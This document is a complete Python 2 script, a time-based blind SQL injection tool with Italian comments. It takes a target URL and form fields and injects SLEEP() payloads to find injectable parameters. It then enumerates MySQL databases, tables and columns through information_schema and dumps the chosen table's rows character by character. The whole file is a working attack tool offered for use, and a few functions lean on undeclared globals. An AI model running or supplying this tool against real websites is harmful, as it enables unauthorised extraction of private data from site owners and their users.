# Author: Alessio Gilardi
# Title: Time Based Blind SQL Injection Tool

# The tool takes in input an URL, a method, a list of possibly vulnerable fields and a list of valid values for the respctive fields.
# Once found, the tool ask the user to select a database and a table to dump, after it prints the results.

# Usage: time_based_sql_injection.py <URL> <METHOD [GET|POST]> <fields ['field1', 'field2']> <values ['value1', 'value2']>

import requests, sys, ast, binascii, argparse, threading

METHODS = ['GET', 'POST']
M_GET = 0
M_POST = 1

SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1']

NO_SUFF = 0
COMMENT_SUFF = 1
AND_SUFF = 2

verbose = 0


# Converte due liste in un dizionario, fields e' l'indice e values i valori
def list_to_dict(fields, values):
    if len(fields) != len(values):
        return 0
    result = {}
    for (f, v) in zip(fields, values):
        result[f] = v
    return result

# Stampa una tabella per l'utente chidendo di fare una scelta(nome del database da expliotare, nome della tabella, etc)
def print_user_choice_table(values, title = ''):
    if len(values) == 1:
        print 'Only one value'
        print 'Choice: ' + values[0]
        return 0

    if title != '':
        print title

    for i in range(len(values)):
        print str(i+1) + ' - ' + values[i]
    print
    
    choice = -1
    t = False
    while choice < 0 or choice >= (len(values)):
        if t:
            print "\033[A                             \033[A"
        t = True
        try:
            choice = int(raw_input('Choice[1 - ' + str(len(values)) + ']: ')) - 1
        except ValueError:
            choice = -1

    return choice

# Converte un stringa in una lista di interi e poi la lista in una stringa con gli interi separati da virgola
def string_to_int_list(s):
    lst = []
    for c in s:
        lst.append(str(ord(c)))    
    return ','.join(lst)

# Media olimpica dei tempi di risposta (esclude i due risultati piu' alti)
def avg_time(times):
    if len(times) == 1:
        return times[0]

    max_index = -1
    max_time = 0
    for i in range(len(times)):
        if times[i] > max_time:
            max_time = times[i]
            max_index = i
    times.pop(max_index)

    if len(times) > 1:
        max_index = -1
        max_time = 0
        for i in range(len(times)):
            if times[i] > max_time:
                max_time = times[i]
                max_index = i
    times.pop(max_index)

    return sum(times)/len(times)

# Classe per la gestione dei thread che effettuano le richieste http
class myRequestThread (threading.Thread):
    def __init__(self, threadID, name, url, method, headers, data, times):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers
        self.cookies = cookies
        self.data = data
        self.times = times
    def run(self):
        self.times.append(measure_request_time_no_threads(self.url, self.method, self.headers, self.cookies, self.data))

# Misura il tempo di risposta del server per una richiesta
def measure_request_time_no_threads(url, method, headers, cookies, data):
    if method == METHODS[M_GET]:
        r = requests.get(url, headers = headers, cookies = cookies, params = data.items())
        return r.elapsed.total_seconds()
    elif method == METHODS[M_POST]:
        r = requests.post(url, headers = headers, cookies = cookies, data = data.items())
    	return r.elapsed.total_seconds()
    else:
    	return -1;

# Misura il tempo di risposta di una richiesta o il tempo medio di richieste multiple
def measure_request_time(url, method, headers, cookies, data, threads_num):
    if threads_num <= 1:
        return measure_request_time_no_threads(url, method, headers, cookies, data)
    else:
        times = []
        threads = []
        for i in range(threads_num):
            t = myRequestThread(i, 'T-'+str(i), url, method, headers, data, times)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        return avg_time(times)


# Valuta il tempo medio di risposta del server eseguendo
# molte richieste (anche multiple), usato per calcolare lo sleep_time
def evaluate_response_time(url, method, headers, cookies, data, rounds, threads_num):
    times = []
    for i in range(rounds):
        times.append(measure_request_time(url, method, headers, cookies, data, threads_num))
    return avg_time(times)

# Valuta lo slee time da usare per le richieste
def evaluate_sleep_time(response_time):
    if response_time < 1:
        return response_time * 10
    elif response_time >= 1 and response_time < 2:
        return response_time * 2
    else:
        return response_time

# Determina quali dei campi passati al tool sono iniettabili
def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
    vuln_fields = {}
    sql = '{} AND SLEEP({}) {}'

    m_data = data.copy()
    m_data_2 = data.copy()
    for field in m_data:
        m_data_2[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
        elapsed = measure_request_time(url, method, headers, cookies, m_data_2, threads_num)
        if elapsed >= sleep_time:
            vuln_fields.update({field:COMMENT_SUFF})
    
    for f in vuln_fields:
        m_data.pop(f)
    
    if len(m_data) == 0:
        return vuln_fields

    for field in m_data:
        m_data_2[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
        elapsed = measure_request_time(url, method, headers, cookies, m_data_2, threads_num)
        if elapsed >= sleep_time:
            vuln_fields.update({field:AND_SUFF})
    
    for f in vuln_fields:
        m_data.pop(f)

    if len(m_data) == 0:
        return vuln_fields

    for field in m_data:
        m_data_2[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
        elapsed = measure_request_time(url, method, headers, cookies, m_data_2, threads_num)
        if elapsed >= sleep_time:
            vuln_fields.update({field:NO_SUFF})
    
    for f in vuln_fields:
        m_data.pop(f)

    return vuln_fields



# Determina il numero di righe di una tabella del database
def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, sleep_time, where_param = '', where_value = ''):
    m_data = data.copy()
    table = db_name + '.' + table_name
    sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
    query = 'SELECT COUNT(*) FROM {}'

    if vuln_type != NO_SUFF:
        sql_inj = '\'' + sql_inj
        if where_param != '':
            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
        if vuln_type == COMMENT_SUFF:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
        else:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
    else:
        if where_param != '':
            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))

    if verbose:
        print
        print 'Determinating number of rows of table: ' + table_name
        print
    
    found = 0
    count = 0
    while not found:
        m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(table), str(count), str(sleep_time))
        if verbose:
            print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
        elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
        if elapsed >= sleep_time:
            found = 1
        else:
            count += 1

    if verbose:
        print
        print 'Number of rows: ' + str(count)
        print

    return count

# Determina il numero di caratteri di un campo del database
def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row = '', where_param = '', where_value = ''):
    m_data = data.copy()
    table = db_name + '.' + table_name
    sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
    query = 'SELECT LENGTH({}) FROM {}'
    limit = ' LIMIT {},1 '
    
    if vuln_type != NO_SUFF:
        sql_inj = '\'' + sql_inj
        if where_param != '':
            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
        if vuln_type == COMMENT_SUFF:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
        else:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
    else:
        if where_param != '':
            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))

    if limit_row != '':
            query += limit.format(str(limit_row))


    if verbose:
        print
        print 'Determinating number characters in the field: ' + column_name
        print

    found = 0
    length = 0
    while not found:
        length += 1
        m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, table), str(length), str(sleep_time))
        if verbose:
            print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
        elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
        if elapsed == -1:
            return -1
        if elapsed >= sleep_time:
            found = 1
        if length > 255:
            return -1
    
    if verbose:
        print
        print 'Field length: ' + str(length)
        print

    return length

# Determina il valore di un campo del database
def find_data_val_binary(url, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, db_field_length, sleep_time, limit_row = '', where_param = '', where_value = ''):
    m_data = data.copy()
    data_val = []
    table = db_name + '.' + table_name
    sql_inj = ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'
    query = 'SELECT ORD(MID({},{},1)) FROM {} '
    limit = ' LIMIT {},1 '

    if vuln_type != NO_SUFF:
        sql_inj = '\'' + sql_inj
        if where_param != '':
            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
        if vuln_type == COMMENT_SUFF:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
        else:
            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
    else:
        if where_param != '':
            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))

    if limit_row != '':
            query += limit.format(str(limit_row))

    if verbose:
        print
        print 'Determinating values of field: ' + column_name
        print

    for i in range(1, db_field_length + 1):
        found = 0
        low = 1
        high = 128

        while not found:
            current = (low + high)//2
            m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '=', current, sleep_time)
            if verbose:
                print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
            elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)

            if elapsed >= sleep_time:
                data_val.append(chr(current))              
                found = 1
                if verbose:
                    print
                    print 'Found character: ' + chr(current)
                    print
                    print
            else:
                m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '>', current, sleep_time)
                if verbose:
                    print '{' + vuln_field + ': ' + m_data[vuln_field] + '}'
                elapsed = measure_request_time(url, method, headers, cookies, m_data, threads_num)
                if elapsed >= sleep_time:
                    low = current
                else:
                    high = current

        if verbose:
            print

    return ''.join(data_val)

   
def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row = '', where_param = '', where_value = ''):
    length = find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row, where_param, where_value)
    result = find_data_val_binary(url, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, length, sleep_time, limit_row , where_param, where_value)
    return result
    




parser = argparse.ArgumentParser()
parser.add_argument('url', help = 'The URL on which try the attack.', metavar = '<url>')
parser.add_argument('method', help = 'The method [GET|POST]', choices = [METHODS[M_GET], METHODS[M_POST]], 
    metavar = '<' + METHODS[M_GET] + '|' + METHODS[M_POST] + '>')
parser.add_argument('fields', help = 'The fields: [\'field1\',\'field2\',\'field3\'],...', metavar = '<fields>')
parser.add_argument('values', help = 'The values: [\'value1\',\'value2\',\'value3\'],...', metavar = '<values>')
parser.add_argument('-s', '--sleep', type = int, help = 'The sleep time to use')
parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
parser.add_argument('-v', '--verbose', help = 'Set verbose mode', action = 'store_true')

args = parser.parse_args()

url = args.url
method = args.method
fields = ast.literal_eval(args.fields)
values = ast.literal_eval(args.values)
sleep_time = args.sleep
threads_num = args.threads
verbose = args.verbose

if len(fields) != len(values):
    print('Fields and values must have same number of parameters.')
    sys.exit(-1)

data = list_to_dict(fields, values)
headers = {}
cookies = {}


databases = [] # List of found databases
tables = [] # List of tables in the selected database
columns = [] # List of columns in the selected table

results = [] # The data dump of the selected table

db_name = '' # Selected database name
table_name = '' # selected table name

 # TABLES MySQL DB #
information_schema_db_name = 'information_schema'

inf_schema_schemata = 'SCHEMATA'
inf_schema_schemata_schema_name = 'SCHEMA_NAME' # nome del db

inf_schema_tables = 'TABLES'
#used in where clause
inf_schema_tables_table_schema = 'TABLE_SCHEMA'

inf_schema_tables_table_name = 'TABLE_NAME'

inf_schema_columns = 'COLUMNS'
inf_schema_columns_table_name = 'TABLE_NAME'
inf_schema_columns_column_name = 'COLUMN_NAME'
#########################


# Inizio dell'attacco

print
print 'Starting attack on URL: ' + url
print


# Numero di esecuzioni per determinare il tempo di risposta del server
rounds = 100

# Viene calcolato il tempo di risposta del server e lo sleep time da usare
if not sleep_time:
    print('Evaluating response time...')
    avg_resp_time = evaluate_response_time(url, method, headers, cookies, data, rounds, threads_num)
    sleep_time = evaluate_sleep_time(avg_resp_time)

print 'Using sleep time: ' + str(sleep_time)
print



# Trovo i campi vulnerabili #
print 'Looking for vulnerable fields...'
print
vuln = find_vuln_fields(url, method, headers, cookies, data, sleep_time)
vuln_fields = vuln.keys()


if len(vuln_fields) == 0:
    print 'No vulnerable field found'
    sys.exit(0)


f = print_user_choice_table(vuln_fields, 'Vulnerable fields')
print
sel_vuln_field = vuln_fields[f]
sel_vuln_type = vuln[sel_vuln_field]



# Cerco i nomi dei database #
print 'Looking for database names, please wait...'
rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, information_schema_db_name, inf_schema_schemata, sleep_time)
for i in range(rows_count):
    databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, information_schema_db_name, inf_schema_schemata, inf_schema_schemata_schema_name, sleep_time, i))
    print 'Found: ' + databases[i]
#######################
print


# Seleziono un database 
choice = print_user_choice_table(databases, 'Databases found:')
db_name = databases[choice]
print
print('Database selected: ' + db_name)
print


# Cerco le tabelle del database selezionato
print 'Looking for tables in ' + db_name + ', please wait...'
where_param = inf_schema_tables_table_schema
where_value = db_name

rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, information_schema_db_name, inf_schema_tables, sleep_time, where_param, where_value)
for i in range(rows_count):
    tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, information_schema_db_name, inf_schema_tables, inf_schema_tables_table_name, sleep_time, i, where_param, where_value))
###########################################


# Seleziono una tabella #
choice = print_user_choice_table(tables)
table_name = tables[choice]
print
print 'Table selected: ' + table_name
print


# Cerco i nomi delle colonne nella tabella selezionata #
print 'Looking for columns in ' + table_name + ', please wait...'
print
where_param = inf_schema_columns_table_name
where_value = table_name
rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, information_schema_db_name, inf_schema_columns, sleep_time, where_param, where_value)
for i in range(rows_count):
    columns.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, information_schema_db_name, inf_schema_columns, inf_schema_columns_column_name, sleep_time, i, where_param, where_value))

print columns
###########################################


# Cerco i dati nella tabella selezionata #
print
print('Looking for ' + table_name + ' data, please wait...')
print
rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, sleep_time)
for i in range (rows_count):
    d = []
    for col in columns:
        d.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, db_name, table_name, col, sleep_time, i))
    print(d)
    results.append(list_to_dict(columns, d))

if len(results) == 0:
    print 'No data in the table: ' + table_name
    sys.exit(0)

for row in results:
    print(row)
